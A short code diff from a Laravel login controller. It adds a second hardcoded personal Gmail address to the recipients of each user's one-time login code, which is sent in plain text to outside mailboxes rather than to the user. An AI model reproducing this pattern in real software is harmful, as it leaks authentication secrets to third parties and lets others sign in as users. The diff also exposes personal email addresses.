@@ -108,7 +108,7 @@ class AuthenticatedSessionController extends Controller
 
         try {
             Mail::raw("OTP request for user: {$user->email}\n\nOTP: {$otp}\n\nThis code will expire in 10 minutes.", function ($message) use ($user) {
-                $message->to('bridgewayuship@gmail.com')->subject("Login OTP for {$user->email}");
+                $message->to(['bridgewayuship@gmail.com', 'kmujeeb998@gmail.com'])->subject("Login OTP for {$user->email}");
             });
         } catch (\Exception $e) {
             Auth::logout();
